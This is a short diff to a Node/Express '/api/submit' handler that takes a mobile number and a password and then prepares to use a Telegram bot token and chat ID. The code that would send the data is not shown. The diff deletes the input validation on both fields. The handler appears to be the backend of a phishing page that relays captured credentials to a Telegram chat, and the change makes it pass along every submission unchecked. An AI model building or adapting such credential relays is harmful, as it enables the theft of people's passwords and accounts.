@@ -15,11 +15,6 @@ app.post("/api/submit", async (req, res) => {
   const safeMobile = clean(mobile, 20);
   const safepassword = clean(password, 120);
 
-  if (!/^[0-9+\-\s]{8,20}$/.test(safeMobile) ||
-      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(safepassword)) {
-    return res.status(400).json({ error: "Mobile Number or password invalid." });
-  }
-
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   if (token && chatId) {
